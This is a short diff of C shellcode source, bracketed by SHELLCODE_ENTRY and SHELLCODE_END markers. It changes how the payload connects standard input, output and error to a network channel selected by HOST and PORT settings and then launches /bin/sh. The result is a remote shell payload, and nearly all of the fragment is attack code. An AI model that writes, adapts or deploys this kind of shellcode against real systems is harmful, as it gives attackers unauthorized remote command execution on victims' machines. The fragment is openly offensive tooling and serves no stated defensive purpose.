@@ -13,13 +13,7 @@ SHELLCODE_ENTRY {
 #endif
     char *const envp[] = { NULL };
 
-#if (HOST != UNDEFINED_HOST) || (PORT != UNDEFINED_PORT)
     struct channel chan = get_communication_channel();
-    _dup2(chan.rx, stdin);
-    _dup2(chan.tx, stdout);
-    _dup2(chan.tx, stderr);
-#endif
-
-    _execve("/bin/sh", argv, envp); 
+    execute("/bin/sh", argv, envp, chan);
 
 } SHELLCODE_END
